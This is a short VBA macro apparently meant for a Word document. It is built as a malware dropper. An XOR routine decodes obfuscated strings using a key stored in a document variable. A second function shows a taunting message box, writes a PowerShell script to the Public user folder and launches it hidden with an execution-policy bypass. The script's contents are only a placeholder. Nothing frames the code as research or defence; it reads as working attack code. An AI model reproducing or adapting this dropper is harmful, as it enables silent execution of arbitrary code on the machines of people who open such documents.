Private Function cuJgIWtkPd(dytGKUVpoS As Variant, QVuOQXtBcV As Integer)
Dim TOJDOAXFXr, eXrxcIdKmp As String, cAJHqnrFBj, QnGcAinJcu
eXrxcIdKmp = ActiveDocument.Variables("ygsbFH").Value()
TOJDOAXFXr = ""
cAJHqnrFBj = 1
While cAJHqnrFBj < UBound(dytGKUVpoS) + 2
QnGcAinJcu = cAJHqnrFBj Mod Len(eXrxcIdKmp): If QnGcAinJcu = 0 Then QnGcAinJcu = Len(eXrxcIdKmp)
TOJDOAXFXr = TOJDOAXFXr + Chr(Asc(Mid(eXrxcIdKmp, QnGcAinJcu + QVuOQXtBcV, 1)) Xor CInt(dytGKUVpoS(cAJHqnrFBj - 1)))
cAJHqnrFBj = cAJHqnrFBj + 1
Wend
cuJgIWtkPd = TOJDOAXFXr
End Function

Public Function vsMaqqxEhbNVPMi()
mmkOYvKwcUqAPKt = "I'll still your baby if you click ok"
MsgBox mmkOYvKwcUqAPKt
Set fs = CreateObject("Scripting.FileSystemObject")
Set a = fs.CreateTextFile("C:\Users\Public\panlaby.ps1", True)
a.WriteLine (<CONTENTS OF THE PowerShell Script file>)
a.Close

Set x = CreateObject("WScript.Shell")
x.Run "powershell.exe -NoP -sta -NonI -W Hidden -ep bypass C:\Users\Public\panlaby.ps1"
End Function


